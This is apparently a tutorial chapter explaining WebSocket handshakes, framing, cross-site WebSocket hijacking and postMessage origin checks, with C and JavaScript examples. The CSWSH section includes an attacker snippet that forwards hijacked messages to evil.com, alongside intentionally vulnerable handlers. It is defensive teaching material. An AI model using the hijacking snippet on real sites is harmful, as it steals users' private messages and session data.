01 — The Big Analogy

Head First Moment

HTTP is like sending letters — you write one, mail it, wait for a reply. WebSockets are like picking up the phone — once connected, both sides talk freely without the overhead of new envelopes each time. postMessage is like passing notes through a window between two offices — convenient, but you should check who's handing you the note before acting on it.

02 — The WebSocket Upgrade

/* ws.c — HTTP upgrade handshake */
#include <openssl/sha.h>
#include <openssl/bio.h>

#define WS_GUID "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

void ws_server_handshake(int fd, const char *client_key) {
    /* Compute accept key: SHA1(client_key + GUID), base64 */
    char concat[256];
    snprintf(concat, sizeof(concat), "%s%s", client_key, WS_GUID);

    uint8_t sha[20];
    SHA1((uint8_t*)concat, strlen(concat), sha);

    char b64[64];
    base64_encode(sha, 20, b64);

    /* Send 101 Switching Protocols */
    dprintf(fd,
        "HTTP/1.1 101 Switching Protocols\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Accept: %s\r\n"
        "\r\n", b64);
    /* From this point: raw WebSocket frames on fd */
}

/* Client-side upgrade request */
void ws_client_connect(int fd, const char *host, const char *path) {
    char key[25];
    generate_base64_random(key, sizeof(key));   /* 16 random bytes */

    dprintf(fd,
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: %s\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n", path, host, key);
}
Why the GUID Dance?

The Sec-WebSocket-Accept calculation isn't for security — it's to prevent caching proxies from accidentally "upgrading" to WebSocket. A proxy that doesn't understand WebSocket might cache the 101 response and confuse future connections. The GUID ensures only a server that deliberately implemented WebSocket can produce the correct accept value.

03 — WebSocket Frames

/* WebSocket frame format (simplified) */
typedef struct {
    uint8_t  fin_opcode;  /* bit7=FIN, bits0-3=opcode */
    uint8_t  mask_len;    /* bit7=MASK, bits0-6=payload_len */
    uint32_t masking_key; /* only if MASK bit set (client→server) */
    uint8_t *payload;
} ws_frame_t;

#define WS_OP_TEXT   0x1
#define WS_OP_BINARY 0x2
#define WS_OP_CLOSE  0x8
#define WS_OP_PING   0x9
#define WS_OP_PONG   0xA

/* Client frames MUST be masked; server frames MUST NOT be masked */
void ws_send_frame(int fd, uint8_t opcode, const uint8_t *data,
                   size_t len, int is_client) {
    uint8_t header[10];
    header[0] = 0x80 | opcode;  /* FIN=1, opcode */
    if (len < 126) {
        header[1] = (is_client ? 0x80 : 0x00) | len;
    } else if (len < 65536) {
        header[1] = (is_client ? 0x80 : 0x00) | 126;
        header[2] = (len >> 8) & 0xFF;
        header[3] = len & 0xFF;
    }
    write(fd, header, 2 + (len >= 126 ? 2 : 0));

    if (is_client) {
        uint8_t mask[4];
        generate_random(mask, 4);
        write(fd, mask, 4);
        /* XOR each payload byte with the rolling mask */
        for (size_t i = 0; i < len; i++)
            fputc(data[i] ^ mask[i%4], fd);
    } else {
        write(fd, data, len);
    }
}

04 — Cross-Site WebSocket Hijacking (CSWSH)

/* CSWSH: WebSockets don't enforce SOP on connection!
   The browser sends cookies with the upgrade request.
   An attacker page can open a WebSocket to victim.com. */

/* Attacker's page */
/* var ws = new WebSocket("wss://victim.com/chat");
   ws.onmessage = function(e) {
     fetch("https://evil.com/steal?data=" + encodeURIComponent(e.data));
   };
   // Browser sends victim.com's session cookie on the upgrade.
   // If victim.com doesn't check Origin, attacker receives all messages. */

/* Vulnerable server — doesn't check Origin */
void ws_handler_bad(http_request_t *req) {
    ws_server_handshake(req->fd, get_header(req,"Sec-WebSocket-Key"));
    /* No origin check — any site can connect! */
    serve_ws_session(req->fd, get_session(req));
}

/* SECURE server — validates Origin */
void ws_handler_good(http_request_t *req) {
    const char *origin = get_header(req, "Origin");
    if (!origin || strcmp(origin, "https://victim.com") != 0) {
        send_403(req, "Origin not allowed");
        return;
    }
    ws_server_handshake(req->fd, get_header(req,"Sec-WebSocket-Key"));
    serve_ws_session(req->fd, get_session(req));
}

05 — postMessage: Always Check event.origin

/* postMessage lets frames from different origins communicate */

/* SENDER (parent page at https://app.com) */
/* iframe.contentWindow.postMessage("secret_token", "https://widget.com"); */
/*                                               ^^^ target origin — required! */

/* RECEIVER (iframe at https://widget.com) — VULNERABLE */
window.addEventListener("message", function(event) {
    /* BUG: no origin check — accepts messages from anyone */
    process_command(event.data);
});

/* RECEIVER — SECURE */
window.addEventListener("message", function(event) {
    if (event.origin !== "https://app.com") return;  /* ← critical */
    process_command(event.data);
});

/* SENDER mistake: using "*" as target origin */
/* iframe.contentWindow.postMessage("secret_token", "*"); */
/* If the iframe navigated to evil.com, evil.com receives the token!
   Always specify the exact target origin. */
Two Rules for postMessage

Sender: always specify the exact target origin, never "*" for sensitive data. Receiver: always check event.origin before acting on event.data. If either rule is violated, cross-origin message injection or data exfiltration becomes possible. These two bugs appear constantly in code reviews.

07 — Brain Exercise

Sharpen Your Pencil

WebSocket connections bypass CORS entirely — the upgrade request is not a "simple request" but the browser still sends cookies. CSRF tokens don't help because the JS API doesn't use forms. The only defence is server-side Origin checking.

Design a rate-limiting system for WebSocket messages: if a client sends more than 100 messages per second, disconnect them. Where do you implement this — in the frame parser, the session handler, or a middleware layer? What happens if the client uses binary frames instead of text frames to evade a text-based rate limiter?

There Are No Dumb Questions

Q: Do WebSockets work through TLS (wss://)?
Yes — wss:// is WebSocket over TLS, exactly like https:// wraps HTTP. The TLS handshake (B16) happens first, then the WebSocket upgrade happens inside the encrypted tunnel. You should always use wss:// in production — a plain ws:// connection exposes all WebSocket frames to any network observer, including session tokens sent as message payloads.
Q: What's the difference between Server-Sent Events and WebSockets?
Server-Sent Events (SSE) are unidirectional: server pushes events over a persistent HTTP response, client can only receive. WebSockets are bidirectional. SSE is simpler (plain HTTP, works through proxies, automatic reconnect), but if you need client-to-server streaming, you need WebSockets. SSE also respects CORS — unlike WebSockets, it goes through the normal same-origin fetch flow.
